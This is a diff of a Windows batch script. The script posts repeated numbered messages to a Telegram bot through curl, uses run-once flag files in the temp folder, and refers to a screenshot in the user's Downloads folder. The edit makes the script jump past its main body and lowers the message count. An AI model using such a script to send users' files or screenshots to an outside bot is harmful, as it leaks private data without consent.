@@ -1,15 +1,8 @@
 @echo off
 
+goto skip_code
+::goto :EOF
 
-
-
-
-
-del /f /q "%temp%\run_once.flag"
-del /f /q "%temp%\run_once1.flag"
-
-
-exit
 
 
 :: Set your bot token and chat ID
@@ -19,7 +12,7 @@ set "CHAT_ID=-1002460905948"
 set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"
 
 
-::goto :EOF
+
 
 
 set /a NUM=1
@@ -33,7 +26,7 @@ if exist "%temp%\run_once1.flag" goto skip_code
 
 
 :loop
-if %NUM% GTR 50 goto play
+if %NUM% GTR 20 goto play
 
 set "ENCODED_MESSAGE=%NUM%"
 curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
@@ -81,7 +74,6 @@ echo 1 > "%temp%\run_once1.flag"
 
 :skip_code
 
-exit
 
 
 
